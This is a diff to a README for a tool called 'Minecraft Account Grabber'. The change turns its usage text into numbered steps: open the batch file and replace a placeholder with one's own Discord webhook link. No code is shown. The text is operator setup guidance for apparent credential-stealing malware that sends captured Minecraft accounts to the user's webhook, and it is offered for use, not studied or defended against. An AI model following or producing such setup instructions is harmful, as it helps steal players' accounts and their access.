@@ -1,4 +1,6 @@
 # Minecraft Account Grabber
 
 Usage :
-Right Click on the batch file, select Modify, and replace the [WEBHOOK HERE WITHOUT BRACKETS] to your discord webhook link
+1) Right Click on the batch file
+2) Select Modify
+3) Replace [WEBHOOK HERE WITHOUT BRACKETS] to your discord webhook link
